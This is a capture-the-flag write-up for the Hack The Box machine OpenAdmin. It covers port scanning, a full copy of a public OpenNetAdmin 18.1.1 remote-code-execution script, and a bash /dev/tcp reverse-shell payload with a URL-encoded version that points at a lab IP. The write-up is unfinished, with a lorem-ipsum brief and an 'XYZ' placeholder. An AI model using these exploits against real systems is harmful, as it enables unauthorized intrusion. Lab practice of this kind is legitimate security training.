---
title: OpenAdmin Writeup
date: 2020-11-06 00:38:56
categories: [HTB, retired]
published: true
tags: [writeup]
---

[![Banner](https://raw.githubusercontent.com/0xsyr0/0xsyr0.github.io/master/assets/img/htb/openadmin/openadmin_info_card.jpg)](https://www.hackthebox.eu/home/machines/profile/222)

# Information@openadmin:~$

| Column                       | Detail           |
|:-----------------------------|:-----------------|
| Name                         | OpenAdmin        |
| IP                           | 10.10.10.171     |
| Points                       | 20               |
| OS                           | Linux            |
| Difficulty                   | Easy             |
| Creator                      | [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600) |
| Released on                  | 4 Jan 2020       |
| Retired on                   | 2 May 2020       |

# Brief@openadmin:~$

Lorem ipsum dolor sit amet consectetur adipiscing elit sem lacinia ultricies senectus, sapien hendrerit montes hac non bibendum nec mi suscipit accumsan. Himenaeos semper dignissim dictum netus feugiat magna dictumst, blandit non pellentesque hac lacus tristique, dui egestas conubia parturient morbi dis. Dis lacinia auctor neque metus ad nisi felis vitae hac torquent, tempor et vestibulum molestie dapibus natoque sed suspendisse ullamcorper parturient, tristique proin elementum tortor pretium nullam magnis in cras.

Nulla aptent sociosqu vivamus pellentesque donec senectus venenatis, elementum mollis nam augue vulputate vel, himenaeos mus erat dui blandit mi. Parturient rhoncus at tincidunt conubia taciti feugiat metus auctor, curae integer congue elementum mi nulla mattis, facilisi placerat magnis suscipit tristique lectus dapibus. Cubilia potenti platea viverra pulvinar malesuada sagittis sodales mauris quis, sociis parturient a penatibus odio duis molestie venenatis hendrerit praesent, fames vel cras vitae nam turpis montes quisque.

# Summary

# Recon

## Nmap

```shell
$ sudo nmap -sC -sV -oA nmap 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CEST
Nmap scan report for 10.10.10.171
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds
```

We notice that port `22/tcp` and port `80/tcp` are open.

## Gobuster

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/25 18:51:23 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
```

## Footholding

Let's check the found directories and start with `/music`.

> http://10.10.10.171/music

After clicking on `login` we are getting redirected.

> http://10.10.10.171/ona/

If we use google to check for an alrady available exploit, we will find the
following one on exploit-db.

> https://www.exploit-db.com/exploits/47691

```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

At first we download the raw exploit.

```console
$ wget https://www.exploit-db.com/raw/47691
```
Then we make it executable.

```console
$ chmod +x 47691.sh
```
At last we start the shell script and point it to the target url.
And a shell is popping up.

```shell
./47691.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Please make sure you don't forgett the `/` behind `ona` because that would break
your reverse shell.

Now this is a pretty restricted shell because we only can enter url encoded input
to get code execution.

In my case i used the `Burp Suite` included decoder to encode my payload for a
full working reverse shell.

> Payload:

```bash
$ bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
```

> Encoded payload

```console
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
```

At this point we have to start a netcat listener on our desired port, then enter
the url encoded string to our shell to get the reverse shell.

```bash
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$
```

To upgrade our shell to a bit more comfy one, we use python to import `/bin/bash`
and then we modify our shell output and exporting xterm.

```console
www-data@openadmin:/opt/ona/www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This was the first part. For the next part you have to exactly enter the following
inputs, otherwise you will break your shell.

```console
Ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

If you entered everything correctly, you will get a full working shell on the box.

```console
www-data@openadmin:/opt/ona/www$ ^Z
[1]+  Stopped                 nc -lnvp 9001
$ stty raw -echo
$ nc -lnvp 9001

www-data@openadmin:/opt/ona/www$
www-data@openadmin:/opt/ona/www$ export XTERM=xterm
www-data@openadmin:/opt/ona/www$ ls
.htaccess.example  images/            login.php          winc/
config/            include/           logout.php         workspace_plugins/
config_dnld.php    index.php          modules/
dcm.php            local/             plugins/
www-data@openadmin:/opt/ona/www$ ls
```

Please notice that this only works with bash. If you are using zsh you may ran into some issues.

## Enumeration

At first we start with some basic manually enumeration on the `/var/www/html` directory.

XYZ


# Resources

<https://www.exploit-db.com/exploits/47691>
